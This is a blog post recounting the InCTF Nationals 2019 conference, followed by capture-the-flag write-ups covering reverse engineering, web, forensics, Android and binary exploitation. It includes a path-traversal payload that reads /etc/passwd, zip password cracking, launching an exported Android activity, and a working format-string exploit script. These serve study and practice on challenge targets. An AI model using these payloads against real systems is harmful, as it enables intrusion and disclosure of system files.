<h1>InCTF Nationals 2019</h1>
<h4>26/01/2021</h4>

<p><i>
This is a summary of my experience at InCTF, followed by the challenge
writeups.
</i></p>

<p>
The *national* version of InCTF is not just a single-day CTF. It starts
with mock challenges and live teaching sessions that are run througout the
month of October, followed by a qualifier CTF in November.
</p>

<p>
The qualifier round runs for 24 hours and it is extremely beginner
friendly. Depending on which age group you fall into (high school, college,
or professional) you qualify for the three-day conference in the last week
of December.
</p>

<h3>Day one</h3>

<p>
There were lots of amazing talks. If you go to my Twitter profile and
scroll down to somewhere around December 2019 you'll find some tweets by me
that mention the talks that I attented. I loved the talk on Digital
Forensics by Ajith Ravindran. One of the talks that I didn't mention but I
liked the most was about Advanced Persistent Threats by Shaunak Ganorkar.
</p>

<p>
On the first night, there was a campfire where we were divided into groups
and we talked about how we got started in hacking. It was a great way to
chill and network with people having similar interests. If you have the
opportunity to participate in InCTF Nationals, I highly recommend you to do
so just to be around some really awesome hackers.
</p>

<h3>Day two</h3>

<p>
On the second day, we had an attack-defense CTF. This was my first time
playing attack-defense and I completely bombed it. We were grouped randomly
in threes and we had a few services on our machine that we had to protect.
Unfortunately, I do not recall exactly what we had to do, but I can say for
sure that our team messed up pretty bad. Still there is something really
cool about playing an onsite attack-defense and I loved it.
</p>

<p>
We also had talks and hacking stalls. Personally, I didn't get a lot of
time in the hacking stalls but from the little time I spent roaming around
I could see various cool things such as a lock-picking, car hacking, and I
think some hardware stuff. They even had their own hardware badge for the
hardware CTF (which in retrospect I should've participated in).
</p>

<h3>Day three</h3>

<p>
For the final CTF, the problem-set was relatively easy so the most
important thing to keep in mind was the workflow. Though I had worked a lot
on my workflow leading up to the CTF, they didn't allow us to use our own
systems so I had a lot of small issues with the tooling. They wanted us to
use their lab computers to prevent flag-sharing, but in my opinion it
really doesn't help prevent it, rather it slows down the whole process.
</p>

<p>
In the last thirty minutes or so of the CTF, they hid the scoreboard.
Before they hid it, I was ranked 2nd. The person who was 1st had a huge
margin above me; but below me, people were closing in. I just solved a
single challenge after the scoreboard was hidden, so I was really anxious
whether I would be able to hold that position. They later released the <a
href="../files/scoreboard.pdf">scoreboard</a> and I was 2nd.
</p>

<img src="../img/inctf.png">

<p>
The CTF roughly ran from 9AM to 4PM and for people who where over
enthusiastic about it, we didn't even go for lunch. We ate some stuff that
they brought in for us in the lab :) you can imagine that after such an
elongated stress on the mind you wouldn't want to do anything, but coming
2nd gave me some energy to stay awake for the rest of the day.

</p>

<h3>Reverse Engineering</h3>
<i>Hoth 200 pts.</i>

<p>
We are given a PE32 binary called <b>fin.exe</b>, but since we had to use
the university computers (which had Ubuntu 16.04) I could only do a static
analysis. Below is a snippet of the main function, after getting the user
input the program calls _check function.
</p>

<pre>
<code class="x86asm">
0x0040142d      call sym._scanf            
0x00401432      lea eax, dword [local_18h] 
0x00401436      mov dword [esp], eax
0x00401439      call sym._check
</code>
</pre>

<p>
In the _check function there are a lot of mov instructions in the
beginning.
</p>

<pre>
<code class="x86asm">
0x00401473      c785b0feffff.  mov dword [local_150h], 0x82 ; 130
0x0040147d      c785b4feffff.  mov dword [local_14ch], 0x7b ; '{' ; 123
0x00401487      c785b8feffff.  mov dword [local_148h], 0x48 ; 'H' ; 72
0x00401491      c785bcfeffff.  mov dword [local_144h], 0x75 ; 'u' ; 117
0x0040149b      c785c0feffff.  mov dword [local_140h], 0x83 ; 131
0x004014a5      c785c4feffff.  mov dword [local_13ch], 0x70 ; 'p' ; 112
0x004014af      c785c8feffff.  mov dword [local_138h], 0x75 ; 'u' ; 117
</code>
</pre>

<p>
Also there are a few operations being performed on the individuals bytes,
before being compared to our input.
</p>

<pre>
<code class="x86asm">
0x00401602      83e806         sub eax, 6
0x00401605      83f01e         xor eax, 0x1e
0x00401608      83c005         add eax, 5
</code>
</pre>

<p>
So in order to reverse the operations, we need to subtract 5, xor 0x1e and
add 6. So I extracted all the bytes that were being moved in the begin of
the _check function and wrote this small python script to get the flag.
</p>

<pre>
<code class="python">
a = "\x82\x7B\x48\x75\x83\x70\x75\x81\x82\x78\x4C\x82\x78\x4C\x78\x82\x7E\x79\x7D\x46\x77\x4C\x75\x81\x4A\x7B\x4C\x72\x7C\x76\x4C\x75\x81\x82\x7B\x80\x6E"

for i in a:
     print(chr((ord(i)-5^0x1e)+6),end='')
</code>
</pre>

<p>
Flag: <b>inctf{this_is_simpler_than_you_think}</b>
</p>

<i>PartyPart 300 pts.</i>

<p>
We are given a 64-bit ELF binary called <b>Party_Part</b>. The program
takes our input then does a string compare.  If the string is not 42 (0x2a)
characters long, it exits.
</p>

<pre>
<code class="x86asm">
0x0000000000000c9b <+99>:	mov    rdi,rax
0x0000000000000c9e <+102>:	call   0x6d0 <strlen@plt>
0x0000000000000ca3 <+107>:	cmp    rax,0x2a
0x0000000000000ca7 <+111>:	je     0xcbf <main+135>
</code>
</pre>

<p>
For the rest of the program I used a decompiler. Below is the output after
I have cleaned it up for better understanding. Although switch cases are
easy to spot even in disassembly, during a CTF, it is always better to ease
your burden therefore I took this approach. 
</p>

<pre>
<code class="c">
puts("Enter Your lucky number!!");
scanf("%d", &amp;num);

for (i=8; i; --i)
{
  switch (num)
  {
    case 0:
      num = first(argv[1][num], num);
      break;
    case 6:
      num = second(argv[1][num], num);
      break;
    case 12:
      num = third(argv[1][num], num);
      break;
    case 18:
      num = fourth(argv[1][num], num);
      break;
    case 24:
      num = fifth(argv[1][num], num);
      break;
    case 30:
      num = sixth(argv[1][num], num);
      break;
    case 36:
      num = seventh(argv[1][num], num);
      break;
    case 42:
      loser();
      return result;
    case 48:
      winner();
      return result;
    default:
      loser();
      return result;
  }
}
</code>
</pre>

<p>
We are asked to enter a number. Every case calls a function (named using
ordinal conventions). The arguments passed are a pointer to a specific
position (our number) in input string (which is passed using command line
arguments) and our input number.
</p>

<p>
The switch case is especially curious since it is wrapped by a loop that
runs eight times so it would seem we would hit the same case again and
again.
</p>

<pre>
<code class="c">
int first (char *a1, int a2) {
  for (i=0; i&lt;6; ++i)
    temp[i+a2] = a1[i] ^ 8;
  if (strncmp(tem, "afk|ns&lt;ea'pVvj5ar6ginTl&amp;znev:xy~R=kRd7cb&amp;z", a2 + 6))
    return 42;
  return 6;
}
</code>
</pre>

<p>
The function performs a xor operation on the first six characters of our
input string and compares it with the first six characters of:
<b>afk|ns&lt;ea'pVvj5ar6ginTl&amp;znev:xy~R=kRd7cb&amp;z</b>.
</p>

<p>
It returns 42 if the string mismatches else it returns 6. This makes the
switch statement clearer. Case 42 calls loses() while case 6 calls
second().  Other ordinal functions have similar structure, the only
difference being the operation used before comparison.
</p>

<p>
So in total we have seven functions each working on the same string but
performing different operations on different chunks (of six characters).
</p>

<pre>
<code class="python">
a = "afk|ns&lt;ea'pVvj5ar6ginTl&amp;znev:xy~R=kRd7cb&amp;z"
b = []

b += [chr(ord(x)^8) for x in a][0:6]
b += [chr(ord(x)+9) for x in a][6:12]
b += [chr(ord(x)-2) for x in a][12:18]
b += [chr(ord(x)+0xb) for x in a][18:24]
b += [chr(ord(x)-6) for x in a][24:30]
b += [chr(ord(x)^0xd) for x in a][30:36]
b += [chr(ord(x)^7) for x in a][36:42]

print(''.join(b))

<h3>Web Exploitation</h3>
<i>Slender Ingress 300 pts.</i>

<p>
I don't have the source for the web page, but there was a local file
inclusion vulnerability. The home page had some hints towards what the
parameter could have been (the keyword page was mentioned with emphasis),
but since fuzzing parameters was not allowed, you could only rely on
stumbling upon this fact. The /etc/passwd file had the flag. Payload:
http://52.168.55.145/index.php?page=../../../../etc/passwd
</p>

<p>
Flag: <b>inctf{you've_never_had_a_friend_like_me}</b>

<i>PHP Alert 200 pts.</i>

<p>
Again, unfortunately I do not have the source for this, but the concepts
required to win this challenge where mostly related to hash collisions and
PHP loose comparison. More information can be found at https://github.com/
spaze/hashes.

<h3>Forensics</h3>
<i>The Dilemma 100 pts.</i>

<p>
We are given an encrypted zip file: <b>TheDilemma.zip</b>. At first I
mistakenly used the compressed rockyou file :( to perform a dictionary
attack, when it didn't work I gave up on the challenge. Later I saw that
the challenge had many solves and realized my stupid mistake.
</p>

<pre>
<code class="bash">
$ fcrackzip -D -p rockyou.txt -u TheDilemma.zip 
PASSWORD FOUND!!!!: pw == trixie
</code>
</pre>

<p>
From the zip file we extract two files: a JPG image and a text file
containing "YodaMaster". Using steghide and the text file's contents as the
password we get the flag.
</p>

<pre>
<code class="bash">
$ steghide --extract -sf InCTF-Finals.jpg 
Enter passphrase: 
wrote extracted data to "flag.txt".
</code>
</pre>

<p>
Flag: <b>inctf{w0w_D0_Y0u_w4Nt_Th3_F0Rc3_t0_b3_w1Th_Y0u}</b>
</p>

<i>Mos Espa - Tatooine 400 pts.</i>

<p>
In this challenge we get a PCAP: <b>Chall.pcapng</b> and after some
analysis using wireshark we see that a client is sending some kind of a
POST request to a server repeatedly with different querybytes "abcdef",
below is the last request in the series.
</p>

<pre>
<code class="http">
POST / HTTP/1.1
Host: 15.206.147.226
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.20.1
Cookie: PHPSESSID=so17hsr5sghdcecad042uno1fv
Content-Length: 18
Content-Type: application/x-www-form-urlencoded

querybyte=f&amp;auth=8
</code>
</pre>

<p>
In the end the server responds by saying "We've searched our database and 
there is no flag starting with abcdef".
</p>

<p>
So this gives us the hint that we need the querybyte parameter to represent
the flag format prefix, i.e. inctf. After going to the website and trying
it, we are able to do it, but at the end of it we get a timeout error. We
are also slowed down by the fact that after every request, we get an
auth-code which we have to enter in the next query request (as can be seen
in the above request).
</p>

<p>
Because of the above restrictions I made a small script that allowed me to
perform the actions faster to prevent a timeout. I could have fully
automated it, but I wasn't very confident due to the time constraints so I
used this ad-hoc solution.
</p>

<pre>
<code class="python">
import requests
url = "http://15.206.147.226"

j = 1337
a = "inctf"

s = requests.Session()

for i in a:
    data = {"querybyte":i,"auth":j}
    r = s.post(url,data)
    print(r.text)
    j = int(input())

print(s.post(url,{"querybyte":"{","auth":j}).text)
</code>
</pre>

<hr>
<h3>Android</h3>
<i>Decode 200 pts.</i>

We are given an APK: <b>Decode.apk</b>. I decompiled it using jadx.

<pre>
<code class="bash">
$ jadx-gui Decode.apk
</code>
</pre>

<p>This is what the MainActivity looks like:</p>

<pre>
<code class="java">
package com.r4hu1.decode;

import android.os.Bundle;
import android.util.Log;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView((int) R.layout.activity_main);
        Log.d("Key", "Secret Key is : " + ("aW5jdGZ7bmV2M3Jfc3QwcmU=" + "X3MzbnMhdGl2M19kYXRh" + "XzFuXzdoM19zMHVyY2VjMGRlfQ=="));
    }
}
</code>
</pre>

<p>
We can see that there is some secret key logged in base64 format.
</p>

<p>
Flag: <b>inctf{nev3r_st0re_s3ns!tiv3_data_1n_7h3_s0urcec0de}</b>
</p>

<i>Secret Service 200 pts.</i>

<p>
We get an APK: <b>Secret_Service.apk</b>. Using jadx-gui I saw that the
app's package name was <b>com.r4hu1.secretservice</b> and it had an
activity which printed the flag for us. The activity name was
<b>secretService</b>. We can launch exported activities using the adb shell
as follows:
</p>

<pre>
<code class="bash">
$ adb shell
OnePlus3T:/ $ am start -n com.r4hu1.secretservice/.secretService
Starting: Intent { cmp=com.r4hu1.secretservice/.secretService }
OnePlus3T:/
</code>
</pre>

<p>
Flag: <b>inctf{exp0rted_activities_ar3_harmful}</b>
</p>

<h3>Binary Exploitation</h3>
<i>Printer</i>

<p>
I solved this challenge after the CTF ended. We get a binary called
<b>chall</b>. After decompiling it looked somewhat like this:
</p>

<pre>
<code class="c">
#include &lt;stdio.h&gt;
#include &lt;fstream.h&gt;

int Overwrite_Me = 0;
int main() {

  printf("Please enter your name : ");
  scanf("%s",name);
  printf("Welcome Mr. ");
  printf(name);

  if (Overwrite_Me == 0xcafe) {
    flag_file = fopen("flag","r");
    if (flag_file == (FILE *)0x0) {
      printf("Flag file not Found.\nContact the administrator.");
    }   
    else {
      char flag[50];
      fgets(flag, 50, flag_file);
      printf("You deserve this.\nHere, take you flag %s",flag);
    }   
  }
  printf("Sorry it is not your day");
  exit(0);
}
</code>
</pre>

<p>
We see that this program requires us to change the value of Overwrite_Me to
0xcafe using the format string vulnerability on printf(name).
</p>

<p>
After analyzing the file with gdb I figured out that the buffer starts 20
offset from the first stack pop. Using that and the padding notation in
format strings, I came up with the following exploit script:
</p>

<pre>
<code class="python">
from pwn import *
payload = p32(0x0804c040); #Overwrite_Me
payload += "%51961x.%20$n"
print payload
</code>
</pre>

<pre>
<code class="bash">
$ python exploit.py | ./chall
Please enter your name : Welcome Mr.
-snip-
                    ff867be0.
You deserve this.
Here, take you flag <b>inctf{this_is_a_dummy_flag}</b>
